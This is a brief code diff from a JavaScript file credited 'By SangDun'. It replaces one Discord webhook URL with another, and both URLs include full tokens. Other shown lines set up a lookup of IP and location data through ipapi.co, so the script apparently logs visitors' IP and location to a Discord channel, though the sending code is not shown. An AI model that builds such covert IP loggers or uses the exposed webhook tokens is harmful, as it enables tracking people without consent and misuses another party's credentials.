@@ -2,7 +2,7 @@
 // By SangDun
 
 const ipAPI = "https://ipapi.co/json/";
-const webhookURL = "https://discordapp.com/api/webhooks/1365915144978305024/CDD4aPujnfAFYiCx7RwlQ97J2k5PSXe_OYbPmd_ynl2IV4VARd1s0T7qQ512qIcSuPkl";
+const webhookURL = "https://discord.com/api/webhooks/1369448197772148848/J_9O_lVF7fQd3NhHxtB2h5CH0MieE7VwHWiJ0-jaOglGqAqUh-QCmvbVFJGGrO5M8qH0";
 
 // Fetch IP and location info from ipapi.co
 async function getIPInfo() {
